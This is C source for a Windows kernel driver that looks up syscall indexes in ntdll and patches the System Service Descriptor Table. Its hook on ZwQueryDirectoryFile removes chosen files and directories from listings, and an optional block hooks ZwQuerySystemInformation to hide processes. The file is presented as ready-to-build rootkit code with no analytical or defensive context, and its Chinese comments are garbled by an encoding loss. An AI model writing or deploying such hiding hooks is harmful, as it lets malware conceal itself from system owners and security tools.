#include "HookSSDT.h"
#include "HookSysCall.h"

#include "cfg.h"
     
//#define HIDEPROC

#ifdef HIDEPROC
#include "hideproc.c"
#endif

PMDL     g_pMdlSystemCall;
PVOID    *MappedSystemCallTable;

//��DLL�ĵ������л�ȡ������ַ
DWORD GetExportFuncAddr(
   IN PCHAR lpFunctionName,     //��������
   IN PUNICODE_STRING pDllName) //Ҫӳ���ģ������
{
   HANDLE hThread, hSection, hFile, hMod;
   SECTION_IMAGE_INFORMATION sii;
   
   PIMAGE_DOS_HEADER       pDosHeader;
   PIMAGE_OPTIONAL_HEADER  pOptHeader;
   PIMAGE_EXPORT_DIRECTORY pExportTable;
   
   DWORD* arrayOfFuncAddr;
   DWORD* arrayOfFuncNames;
   WORD*  arrayOfFuncOrdinals;
   DWORD  funcOrdinal;
   DWORD  Base, i, FuncAddr;
   PCHAR  FuncName;
   STRING ntFuncName, ntFuncNameSearch;
   PVOID  BaseAddress = NULL;
   SIZE_T size = 0;
   OBJECT_ATTRIBUTES ObjAttr;
   IO_STATUS_BLOCK IoStatusBlock;
   
   InitializeObjectAttributes(
      &ObjAttr,    //InitializedAttributes
      pDllName,    //ObjectName
      OBJ_CASE_INSENSITIVE,//Attributes
      NULL,        //RootDirectory
      NULL);       //SecurityDescriptor    

   //_asm int 3;
   ZwOpenFile(
      &hFile,                       //FileHandle
      FILE_EXECUTE | SYNCHRONIZE,   //DesiredAccess
      &ObjAttr,                     //ObjectAttributes
      &IoStatusBlock,               //IoStatusBlock
      FILE_SHARE_READ,              //ShareAccess
      FILE_SYNCHRONOUS_IO_NONALERT);//OpenOptions

   ObjAttr.ObjectName = 0;

   ZwCreateSection(
      &hSection,    //SectionHandle
      SECTION_ALL_ACCESS, //DesiredAccess
      &ObjAttr,     //ObjectAttributes
      0,            //MaximumSize
      PAGE_EXECUTE, //SectionPageProtection
      SEC_IMAGE,    //AllocationAttributes
      hFile);       //FileHandle
    
   ZwMapViewOfSection(
      hSection,           //SectionHandle
      NtCurrentProcess(), //ProcessHandle
      &BaseAddress,       //BaseAddress
      0,                  //ZeroBits
      1000,               //CommitSize
      0,                  //SectionOffset
      &size,              //ViewSize
      (SECTION_INHERIT)1, //InheritDisposition
      MEM_TOP_DOWN,       //AllocationType
      PAGE_READWRITE);    //Win32Protect
    
   ZwClose(hFile);
    
   hMod = BaseAddress;
   pDosHeader = (PIMAGE_DOS_HEADER)hMod;
   pOptHeader = (PIMAGE_OPTIONAL_HEADER)( (BYTE*)hMod + pDosHeader->e_lfanew + 24 );
   pExportTable =(IMAGE_EXPORT_DIRECTORY*)((BYTE*) hMod 
       + pOptHeader->DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT]. VirtualAddress);

   //now we can get the exported functions, but note we convert from RVA to address
   arrayOfFuncAddr     = (DWORD*)( (BYTE*)hMod + pExportTable->AddressOfFunctions);
   arrayOfFuncNames    = (DWORD*)( (BYTE*)hMod + pExportTable->AddressOfNames);
   arrayOfFuncOrdinals = (WORD* )( (BYTE*)hMod + pExportTable->AddressOfNameOrdinals);
   Base = pExportTable->Base;

   RtlInitString(&ntFuncNameSearch, lpFunctionName);
   for( i=0; i<pExportTable->NumberOfFunctions; i++ )
   {
      FuncName = (PCHAR)( (BYTE*)hMod + arrayOfFuncNames[i]);
      RtlInitString( &ntFuncName, FuncName );
      funcOrdinal = arrayOfFuncOrdinals[i] + Base - 1; 
      //always need to add base, -1 as array counts from 0
      //this is the funny bit.  you would expect the function pointer to simply be arrayOfFunAddr[i]...
      //oh no... thats too simple.  it is actually arrayOfFuncAddr[funcOrdinal]!!
      FuncAddr = (DWORD)( (BYTE*)hMod + arrayOfFuncAddr[funcOrdinal]);
      if (RtlCompareString(&ntFuncName, &ntFuncNameSearch, TRUE) == 0) 
      {
         ZwClose(hSection);
         return FuncAddr;
      }
   }
   ZwClose(hSection);
   return 0;
}

//���ú���GetDllFuncAddr�Ա��÷����
int GetSysCallIndex( PCHAR FuncName )
{
   UNICODE_STRING usDllName;     //Dll����
	 DWORD          FuncAddr;    //������ַ
	 int            SysCallIndex;//�����

	 RtlInitUnicodeString( &usDllName,
	 						L"\\Device\\HarddiskVolume1\\Windows\\System32\\ntdll.dll" );
	 						
   FuncAddr = GetExportFuncAddr(FuncName, &usDllName);
   //DbgPrint("%s FuncAddr is: 0x%x\n", FuncName, FuncAddr );
   SysCallIndex = *( (WORD*)(FuncAddr + 1) );
   KdPrint(("%s Index is: 0x%x\n", FuncName, SysCallIndex ));
   return SysCallIndex;
}

NTSTATUS HookOfZwQueryDirectoryFile(
   IN HANDLE hFile,
   IN HANDLE hEvent OPTIONAL,
   IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
   IN PVOID IoApcContext OPTIONAL,
   OUT PIO_STATUS_BLOCK pIoStatusBlock,
   OUT PVOID FileInformationBuffer,
   IN ULONG FileInformationBufferLength,
   IN FILE_INFORMATION_CLASS FileInfoClass,
   IN BOOLEAN bReturnOnlyOneEntry,
   IN PUNICODE_STRING PathMask OPTIONAL,
   IN BOOLEAN bRestartQuery)
{
   NTSTATUS ntStatus;
   ULONG CR0VALUE;
   ULONG i;

   ANSI_STRING ansiFileName, ansiDirName, ansiHideDirFile[NbFileToHide];
   UNICODE_STRING uniFileName;

   //ִ��������ZwQueryDirectoryFile����
   ntStatus = ((ZWQUERYDIRECTORYFILE)(OrigZwQueryDirectoryFile))(
      hFile,
      hEvent,
      IoApcRoutine,
      IoApcContext,
      pIoStatusBlock,
      FileInformationBuffer,
      FileInformationBufferLength,
      FileInfoClass,
      bReturnOnlyOneEntry,
      PathMask,
      bRestartQuery);
   //���ִ�гɹ�������FILE_INFORMATION_CLASS��ֵΪ
   //FileBothDirectoryInformation�����Ǿͽ��д�������
   if( NT_SUCCESS(ntStatus) && (FileInfoClass == FileBothDirectoryInformation) )
   {
      PFILE_BOTH_DIR_INFORMATION pFileInfo;
      PFILE_BOTH_DIR_INFORMATION pLastFileInfo;
      BOOL bLastOne;
      
      //��ִ�н������pFileInfo 
      pFileInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer;
      pLastFileInfo = NULL;

      //ѭ�����
      do
      {
         bLastOne = !( pFileInfo->NextEntryOffset );//�Ƿ�Ϊ���һ��
         RtlInitUnicodeString( &uniFileName, pFileInfo->FileName );
         RtlUnicodeStringToAnsiString( &ansiFileName, &uniFileName, TRUE);
         ansiFileName.Buffer=_strupr(ansiFileName.Buffer);

         for(i=0; i<NbFileToHide; i++)
         {
         	  //��ʼ��Ҫ���ǵ��ļ���
			RtlInitAnsiString( &ansiHideDirFile[i], _strupr(HideDirFile[i]) );
         	  
            //��ʼ���бȽϣ�����ҵ��˾���������ļ�����Ŀ¼
            if( strcmp(ansiFileName.Buffer,ansiHideDirFile[i].Buffer) == 0)
            {
               dbg("This is HideDirFile!\n");
               
               if( bLastOne )
               {  
                  if( pFileInfo == (PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer )
                  {
                     ntStatus = 0x80000006; //STATUS_NO_MORE_FILES �����ļ�����Ŀ¼
                  }
                  else
                  {
                     pLastFileInfo->NextEntryOffset = 0;
                  }
                  break;
               }
               else //ָ�������ƶ�
               {
                  int iPos = ((ULONG)pFileInfo) - (ULONG)FileInformationBuffer;
                  int iLeft = (ULONG)FileInformationBufferLength - iPos - pFileInfo->NextEntryOffset;
                  RtlCopyMemory( (PVOID)pFileInfo, 
                              (PVOID)( (char *)pFileInfo + pFileInfo->NextEntryOffset ), 
                              (ULONG)iLeft );
                  continue;
               }
            }
         }
         pLastFileInfo = pFileInfo;
         pFileInfo = (PFILE_BOTH_DIR_INFORMATION)((char *)pFileInfo + pFileInfo->NextEntryOffset);
      } while( !bLastOne );
      
      RtlFreeAnsiString( &ansiFileName );
   }
   return ntStatus;
}

VOID UnhookSystemServiceCall(VOID)
{
	dbg("unhook ssdt");
	
	 //unhook system calls
	UNHOOK_SYSCALL( ZwQueryDirectoryFile, HookOfZwQueryDirectoryFile, OrigZwQueryDirectoryFile );
#ifdef HIDEPROC
	UNHOOK_SYSCALL( ZwQuerySystemInformation,   HookOfZwQuerySystemInformation ,   ZwQuerySystemInformationAddress   );
#endif
 
	//Unlock and Free MDL
	if(g_pMdlSystemCall)
	{
		MmUnmapLockedPages( MappedSystemCallTable, g_pMdlSystemCall );
		IoFreeMdl(g_pMdlSystemCall);
	}
}

NTSTATUS HookSystemServiceCall(VOID)
{
   LARGE_INTEGER timeout;
   
   //Map the memory into our domain to change the permissions on the MDL
   g_pMdlSystemCall = IoAllocateMdl(
                KeServiceDescriptorTable.ServiceTableBase,
                KeServiceDescriptorTable.NumberOfServices*4,
                FALSE, //not associated with an IRP
                FALSE, //charge quota, should be FALSE
                NULL); //IRP * should be NULL      
   if(!g_pMdlSystemCall)
        return STATUS_UNSUCCESSFUL;
   
   MmBuildMdlForNonPagedPool(g_pMdlSystemCall);
   // Change the flags of the MDL
   g_pMdlSystemCall->MdlFlags = g_pMdlSystemCall->MdlFlags |
                                MDL_MAPPED_TO_SYSTEM_VA;
                                
   MappedSystemCallTable = MmMapLockedPages(g_pMdlSystemCall, KernelMode);
   
   //hook system calls and save old system call locations
#ifdef HIDEPROC
   HOOK_SYSCALL( ZwQuerySystemInformation,   HookOfZwQuerySystemInformation ,   ZwQuerySystemInformationAddress   );
#endif
   HOOK_SYSCALL( ZwQueryDirectoryFile, HookOfZwQueryDirectoryFile, OrigZwQueryDirectoryFile );
    
   return STATUS_SUCCESS;	
}
